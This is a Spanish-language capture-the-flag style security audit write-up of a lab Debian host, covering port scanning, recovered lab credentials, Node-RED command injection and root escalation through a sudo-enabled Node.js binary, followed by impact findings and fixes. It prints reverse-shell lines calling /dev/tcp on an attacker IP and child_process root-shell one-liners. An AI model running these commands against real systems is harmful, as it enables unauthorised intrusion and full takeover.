<img width="429" height="137" alt="image" src="https://github.com/user-attachments/assets/80f7212a-21a1-413f-a804-d8ed4cc2d370" /># Auditoría de Seguridad

## Reconocimiento

Durante el escaneo de red se identificaron múltiples puertos TCP abiertos en el sistema. El puerto 22 corresponde al servicio SSH (OpenSSH 8.4p1), utilizado para administración remota segura.

Adicionalmente, se detectaron varios servicios web basados en Node.js ejecutándose en los puertos 1880, 3030 y 4040, los cuales exponen interfaces web asociadas a Node-RED y aplicaciones internas (SIEM Taskboard y Net Defender Sim). Esto indica la presencia de servicios de gestión y monitorización accesibles vía HTTP.

La enumeración no mostró otros puertos abiertos relevantes, sugiriendo una superficie de ataque relativamente reducida, aunque con múltiples aplicaciones web expuestas que podrían requerir revisión de seguridad.

```bash
Host is up (0.032s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
1880/tcp open  http    Node.js Express framework
|_http-cors: GET POST PUT DELETE
|_http-title: Node-RED
3030/tcp open  http    Node.js (Express middleware)
|_http-title: SIEM Taskboard
4040/tcp open  http    Node.js (Express middleware)
|_http-title: Net Defender \xE2\x80\x94 Sim
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Análisis de las principales vulnerabilidades a partir de los servicios encontrados

#### RegreSSHion (No afectado)
RegreSSHion (CVE-2024-6387): Aunque se trata de una vulnerabilidad importante en OpenSSH, Debian 11 Bullseye fue confirmado oficialmente como no afectado, ya que esta regresión específica fue introducida en OpenSSH 8.5p1

```bash
┌──(kali㉿kali)-[~/CVE-2024-6387-Vulnerability-Checker]
└─$ python3 CVE-2024-6387-Vulnerability-Checker.py 10.130.152.121

  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++                                        
  + CVE-2024-6387 Vulnerability Checker                       +                                        
  + Created by senhasegura Identity Threat Labs               +                                        
  + Filipi Pires - Threat Researcher & Cybersecurity Advocate +                                        
  + @senhasegura / @filipipires                               +                                        
  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++                                        

SERVER NOT VULNERABLE: 1
[SAFE] -> 10.130.152.121:22-> Running SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
```
#### Vulnerabilidades intrínsecas a NODE-RED (Afectado)
El uso de los nodos exec e inject en Node-RED presenta una de las mayores vulnerabilidades del sistema ya que la Ejecución Remota de Comandos (RCE) permite, que si un atacante accede al editor web (que por defecto no tiene autenticación) en este caso en el puerto 1880 previamente escaneado, puede arrastrar un nodo exec a un flujo, configurarlo para ejecutar código malicioso del sistema operativo y desplegarlo.
Por ello tenemos los siguiente problemas principales:

- Acceso sin autenticación: La interfaz web (puerto 1880) está abierta sin contraseña de fábrica.
- El nodo exec: Este nodo ejecuta comandos directamente en el sistema operativo subyacente en donde un atacante puede introducir comandos como rm -rf / o instalar malware.
- El nodo inject: Se usa para activar el nodo exec de forma remota, manual o programada, sin necesidad de interactuar con hardware físico.
- Impacto severo: Si Node-RED corre como administrador o root, el atacante toma el control total del equipo (lo cual es un riesgo crítico documentado en incidentes como CVE-2025-41656)

---

### Optención del usuario y la contraseña
En este caso, el usuario y la contraseña se encuentran en los dos puertos restantes.
El usuario se encuentra en el 4040 y es: D.Finkelstein.

La contraseña esta en el 3030, pero en este caso se requirió una investigación más profunda de la página para poder resolver el ejercicio, en donde las respuestas a las preguntas se encuentran al inspeccionar la página web, en donde se encuentra la ruta: `http://10.128.175.117:3030/api/tasks`. Cabe resaltar que esta es una forma de simplificar el proceso, pero las respuestas deben encontrarse de igual forma para entender el contexto del ejercicio. Al finalizar obtenemos que la contraseña es: Mr.0oG13_B00g13

---
---
## Explotación

Entramos usando el usuario y contraseña
```bash
└─$ ssh dfinkelstein@10.128.143.249                                   
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dfinkelstein@10.128.143.249's password: 
Linux tnightmarebc 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
Last login: Fri Oct 31 17:20:09 2025 from 172.16.162.1
```

Inspeccionamos todos los usuarios, en donde destacan estos 4 usuarios del sistema:
```bash
root:x:0:0:root:/root:/bin/bash
dev:x:1000:1000:dev,,,:/home/dev:/bin/bash
nightmare:x:1001:1001:,,,:/home/nightmare:/bin/bash
dfinkelstein:x:1002:1002:,,,:/home/dfinkelstein:/bin/bash

```

Verificamos que permisos puede ejecutar el usuario como root
```bash
dfinkelstein@tnightmarebc:~$ sudo -l
Matching Defaults entries for dfinkelstein on tnightmarebc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dfinkelstein may run the following commands on tnightmarebc:
    (root) NOPASSWD: /usr/local/bin/nodered-toggle, /usr/local/bin/nodered-toggle *
dfinkelstein@tnightmarebc:~$ 
```

Verificamos que hay disponible dentro del usuario, incluidos los archivos ocultos
```bash
dfinkelstein@tnightmarebc:~$ ls -la
total 20
drwx------ 3 dfinkelstein dfinkelstein 4096 oct 31  2025 .
drwxr-xr-x 5 root         root         4096 oct 31  2025 ..
lrwxrwxrwx 1 dfinkelstein dfinkelstein    9 oct 31  2025 .bash_history -> /dev/null
-rw-r--r-- 1 dfinkelstein dfinkelstein   87 oct 31  2025 .bashrc
-rw------- 1 dfinkelstein dfinkelstein  270 oct 31  2025 help.txt
drwxr-xr-x 3 dfinkelstein dfinkelstein 4096 oct 31  2025 .local
```

Abrimos el archivo help, en donde se encuentra la información para ejecutar el servicio NODE-RED (aunque usando el paso de comprobación de permisos root, ya habiamos visto el comando ejecutable para activar NODE-RED)
```bash
dfinkelstein@tnightmarebc:~$ cat help.txt
Contenido seguro para dfinkelstein
Si controlas Node Red controlas el mundo.

[*] Utiliza el servicio para seguir adelante: start|stop|restart|status

- Activar Servicio: sudo /usr/local/bin/nodered-toggle start
- Parar Servicio: sudo /usr/local/bin/nodered-toggle stop
```

Activamos NODE-RED
```bash
dfinkelstein@tnightmarebc:~$ sudo /usr/local/bin/nodered-toggle start
✅ Node-RED activo
```

---
---
## Escalada de privilegios

### Opción #1 Inyección mediante NODE-RED (Reverse Shell)
Gracias a NODE-RED, tal como se puede ver en la imágen, tenemos que el comando  `bash -c 'bash -i >& /dev/tcp/192.168.128.160/4444 0>&1'` funciona cuando se inyecta porque el sistema ejecuta el input del usuario directamente en el sistema operativo mediante nodos como exec, sin una validación o sanitización adecuada, lo que permite que el string sea interpretado por Bash y se establezca la conexión inversa hacia el atacante.
Permitiendo ingresar al usuario dev, del cual no se posee la contraseña. Antes de realizar este paso, se debe tener una terminal escuchando a través el puerto 4444.

![](Evidencias_Visuales/inyección_NODE-RED)

### Opción #2 Inyección mediante NODE-RED (Reverse Reverse Shell)
Se utiliza la máquina con el túnel 192.168.128.160, ha establecido un oyente en el puerto 1235 que ya registra una conexión entrante, mientras que mediante NODE-RED se ejecuta el comando bash -c 'bash -i >& /dev/tcp/192.168.128.160/5555 0>&1', el cual abre una shell interactiva de Bash y redirige tanto la entrada como la salida de esta hacia el puerto 5555 del atacante a través del dispositivo /dev/tcp/, logrando así que se pueda obtener el control remoto total sobre la terminal del sistema infectado, con capacidad para ejecutar comandos, manipular archivos y escalar privilegios, quedando evidencia de esta actividad en el identificador de proceso PID 2544 que mantiene viva la sesión.

![](Evidencias_Visuales/reverse_reverse_shell)
![](Evidencias_Visuales/conexión_kali)




### Escalada de privilegios a root

#### Opción #1: GFTOBins y shell inversa
Mediante el uso de GFTOBins encontramos un comando que permite usar Node.js para abrir una shell del sistema y que esta establezca conexión a la terminal del atacante. De la siguiente manera: 

Se obtiene una reverse shell mediante Netcat, estableciendo conexión desde el sistema objetivo hacia el atacante. Pero esta shell no tiene la capacidad de ejecutar comandos.
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.128.160] from (UNKNOWN) [10.130.173.137] 37516
bash: no se puede establecer el grupo de proceso de terminal (307): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
```

Por esto hacemos un "TTY spawn", también llamado "pseudo-terminal upgrade" para mejorar la shell, permitir control de procesos y preparar una interacción normal.
```bash
dev@tnightmarebc:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
dev@tnightmarebc:~$ ^Z
zsh: suspended  nc -lvnp 4444
```

Volvemos a mejorar la terminal usando un "stty raw mode fix" (stty raw -echo;fg) y un "terminal emulation setup" (export TERM=xterm), para posteriormente ejecutar el comando `sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'`, lo que nos da acceso completo a root y por ende a todo el sistema.
```bash                                                                                                    
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg       
[2]  - continued  nc -lvnp 4444

dev@tnightmarebc:~$ 
dev@tnightmarebc:~$ export TERM=xterm
dev@tnightmarebc:~$ sudo -l
Matching Defaults entries for dev on tnightmarebc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dev may run the following commands on tnightmarebc:
    (root) NOPASSWD: /usr/bin/node
dev@tnightmarebc:~$ sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
root@tnightmarebc:/home/dev# 
```

#### Opción #2: Root Shell mediante sudo NOPASSWD de Node.js y ejecución de execSync

En este segundo caso, tenemos que mediante sudo /usr/bin/node -e, se ejecuta código de JavaScript que importa el módulo child_process y lanza una shell interactiva (/bin/bash -i) con execSync, heredando así los privilegios de root.

Como resultado, se obtiene una shell de root, demostrando cómo la ejecución de Node.js con permisos elevados puede permitir la ejecución arbitraria de comandos del sistema y comprometer completamente el host.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.128.160] from (UNKNOWN) [10.128.174.143] 38510
bash: no se puede establecer el grupo de proceso de terminal (323): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
dev@tnightmarebc:~$ sudo -l
sudo -l
Matching Defaults entries for dev on tnightmarebc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dev may run the following commands on tnightmarebc:
    (root) NOPASSWD: /usr/bin/node
dev@tnightmarebc:~$ sudo /usr/bin/node -e "require('child_process').execSync('/bin/bash -i', {stdio: 'inherit'})"
<ess').execSync('/bin/bash -i', {stdio: 'inherit'})"
bash: no se puede establecer el grupo de proceso de terminal (323): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@tnightmarebc:/home/dev#
```
---
---
## Flags encontradas

### Flag de dev
```bash
dev@tnightmarebc:~$ ls -la                                          
ls -la
total 44
drwx------ 5 dev  dev  4096 oct 31  2025 .
drwxr-xr-x 5 root root 4096 oct 31  2025 ..
lrwxrwxrwx 1 root root    9 abr 23  2023 .bash_history -> /dev/null
-rw------- 1 dev  dev   220 ene 15  2023 .bash_logout
-rw------- 1 dev  dev  3520 oct 31  2025 .bashrc
-rw-r--r-- 1 root root    3 oct 31  2025 flows*.json
drwxr-xr-x 3 dev  dev  4096 may 16  2023 .local
drwxr-xr-x 4 dev  dev  4096 jun 17 12:56 .node-red
drwxr-xr-x 3 dev  dev  4096 may 16  2023 .npm
-rw------- 1 dev  dev   807 ene 15  2023 .profile
-rw-r--r-- 1 dev  dev    66 may 16  2023 .selected_editor
-r-------- 1 dev  dev    66 abr  1  2025 user.txt
dev@tnightmarebc:~$ cat user.txt
cat user.txt
27 3b 2d 2d 68 61 76 65 20 69 20 62 65 65 6e 20 70 77 6e 65 64 3f
dev@tnightmarebc:~$ echo "27 3b 2d 2d 68 61 76 65 20 69 20 62 65 65 6e 20 70 77 6e 65 64 3f" | xxd -r -p
<69 20 62 65 65 6e 20 70 77 6e 65 64 3f" | xxd -r -p
((';--have i been pwned?))dev@tnightmarebc:~$ ^C
```

### Flag de tnightmarebc
```bash
root@tnightmarebc:/home/nightmare# ls -la
total 48
drwx------ 4 nightmare nightmare  4096 oct 31  2025 .
drwxr-xr-x 5 root      root       4096 oct 31  2025 ..
-rw-r--r-- 1 nightmare nightmare   220 oct 31  2025 .bash_logout
-rw-r--r-- 1 nightmare nightmare  3526 oct 31  2025 .bashrc
-rw-r--r-- 1 root      root         49 oct 31  2025 .nightmare
-rwxr-xr-x 1 nightmare nightmare 14416 abr  1  2025 nightmare
drwxr-xr-x 4 nightmare nightmare  4096 oct 31  2025 .node-red
drwxr-xr-x 3 nightmare nightmare  4096 oct 31  2025 .npm
-rw-r--r-- 1 nightmare nightmare   807 oct 31  2025 .profile
root@tnightmarebc:/home/nightmare# cat .nightmare
((https://youtu.be/oxkj7sdlXyg?si=hPg0G1LgzhQ7KdLl))
```

### Flag de root

```bash
root@tnightmarebc:~# ls -la
total 44
drwx------  6 root root 4096 oct 31  2025 .
drwxr-xr-x 18 root root 4096 may 16  2023 ..
drwxr-xr-x  2 root root 4096 oct 31  2025 backup_flows
lrwxrwxrwx  1 root root    9 abr 23  2023 .bash_history -> /dev/null
-rw-------  1 root root 3520 oct 31  2025 .bashrc
drw-------  3 root root 4096 ene 15  2023 .local
drwxr-xr-x  4 root root 4096 may 16  2023 .node-red
drwxr-xr-x  4 dev  root 4096 may 16  2023 .npm
-rw-------  1 root root   39 may 16  2023 .npmrc
-rw-------  1 root root  161 jul  9  2019 .profile
-rw-r--r--  1 root root  109 oct 31  2025 root.txt
-rw-r--r--  1 root root   66 may 16  2023 .selected_editor
root@tnightmarebc:~# cat root.txt
aHR0cHM6Ly9vcGVuLnNwb3RpZnkuY29tL2ludGwtZXMvdHJhY2svNjN5MmFMMmRUNnp6dzhGT1NMYU5ycD9zaT1hMDI2ZGRhMTRjNzE0ZWNm
root@tnightmarebc:~# echo "aHR0cHM6Ly9vcGVuLnNwb3RpZnkuY29tL2ludGwtZXMvdHJhY2svNjN5MmFMMmRUNnp6dzhGT1NMYU5ycD9zaT1hMDI2ZGRhMTRjNzE0ZWNm" | base64 -d
((https://open.spotify.com/intl-es/track/63y2aL2dT6zzw8FOSLaNrp?si=a026dda14c714ecfroot@tnightmarebc:~#))
```
---
---
## Análisis de Impacto

### Impacto de Seguridad Identificado

Durante la auditoría de seguridad realizada, se identificaron cuatro hallazgos que afectan significativamente a la seguridad del sistema. La combinación de estas vulnerabilidades permite a un atacante comprometer completamente el servidor.

#### Hallazgo #1: Node-RED sin autenticación. Riesgo: Crítico

Se detectó una instancia de Node-RED accesible sin mecanismos de autenticación. Esta configuración permite que un atacante interactúe con los flujos de trabajo y ejecute comandos arbitrarios mediante nodos como `exec`.

Como consecuencia, un atacante puede obtener ejecución remota de comandos (RCE), comprometer el sistema de forma inmediata, instalar malware, acceder a información sensible o provocar la pérdida total de control del servidor.

#### Hallazgo #2: Permisos sudoers inseguros. Riesgo: Crítico

Se identificó una configuración insegura en el fichero `sudoers` que permite la ejecución de Node.js con privilegios elevados sin necesidad de contraseña.

Mediante la ejecución de código JavaScript utilizando `child_process`, un atacante puede ejecutar comandos del sistema operativo como root y obtener una shell privilegiada. Esto permite modificar configuraciones críticas, instalar puertas traseras y acceder a toda la información almacenada en el sistema.

#### Hallazgo #3: Múltiples servicios web expuestos. Riesgo: Crítico

Durante la fase de reconocimiento se identificaron diversos servicios accesibles desde la red.

La exposición innecesaria de servicios incrementa la superficie de ataque y facilita las tareas de enumeración por parte de un atacante, permitiéndole identificar tecnologías, versiones y posibles vulnerabilidades asociadas para planificar ataques posteriores.

#### Hallazgo #4: Sistema operativo desactualizado. Riesgo: Crítico

El servidor ejecuta una versión de Debian con actualizaciones de seguridad pendientes.

La falta de parches expone el sistema a vulnerabilidades conocidas y documentadas públicamente (CVEs), aumentando el riesgo de explotación mediante herramientas automatizadas y exploits disponibles públicamente.

### Cadena de Compromiso Identificada

La explotación observada durante la auditoría sigue la siguiente secuencia:

1. Acceso a la interfaz de Node-RED expuesta en el puerto 1880.
2. Ejecución de comandos mediante nodos con capacidad de interacción con el sistema operativo.
3. Obtención de acceso como usuario con permisos limitados.
4. Escalada de privilegios mediante la configuración insegura de `sudoers`.
5. Obtención de una shell interactiva con privilegios de root.

Esta cadena de ataque permite el compromiso completo del servidor.

### Impacto para la Organización

* **Confidencialidad:** posible acceso no autorizado a información sensible.
* **Integridad:** modificación o eliminación de datos y configuraciones críticas.
* **Disponibilidad:** interrupción de servicios o despliegue de ransomware.

### Recomendaciones Prioritarias

1. Restringir el acceso a Node-RED y habilitar autenticación.
2. Eliminar permisos `NOPASSWD` innecesarios en la configuración de `sudoers`.
3. Aplicar las actualizaciones de seguridad pendientes del sistema operativo.
4. Revisar y deshabilitar cuentas de usuario que no sean necesarias.
5. Reducir la exposición de servicios accesibles desde la red.

